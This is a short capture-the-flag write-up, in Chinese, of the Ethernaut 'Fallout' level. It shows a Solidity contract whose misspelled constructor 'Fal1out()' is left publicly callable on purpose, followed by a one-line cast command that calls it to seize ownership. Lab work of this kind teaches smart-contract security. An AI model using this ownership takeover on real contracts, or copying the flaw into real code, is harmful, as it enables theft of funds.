# Level 2 Fallout
實例地址：`0x8a2f9ac426fE9233b7dB695060f89bFe4a57AaCd`

##  題目說明
獲得下面合約的所有權來完成這一關

  可能會有用的資訊

*   Solidity、Remix IDE

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

##  POC
該合約使用 `Fal1out()` 可以將 Owner 進行轉移
```bash!
 cast send --account=Panda 0x8a2f9ac426fE9233b7dB695060f89bFe4a57AaCd "Fal1out()" --value=0
```